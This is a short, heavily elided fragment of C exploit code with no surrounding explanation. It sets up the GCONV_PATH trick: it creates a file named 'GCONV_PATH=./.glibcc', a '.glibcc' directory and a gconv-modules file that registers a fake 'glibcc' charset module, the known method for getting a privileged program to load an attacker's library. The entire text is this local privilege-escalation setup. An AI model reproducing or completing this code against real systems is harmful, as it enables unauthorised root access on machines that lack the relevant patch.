...
void entry()
{
    ...
    res = creat("GCONV_PATH=./.glibcc", 0777);

    res = mkdir(".glibcc", 0777);

    fp = fopen(".glibcc/gconv-modules", "w+");
    if (fp == NULL)
    {
        perror("Failed to open output file");
        _exit(1);
    }
    if (fputs("module UTF-8// glibcc// glibcc 2", fp) < 0)
    {
    ...
    if (fork() == 0)
    {
        ...
        if (strstr(buf, "glibcc --version") == buf) {
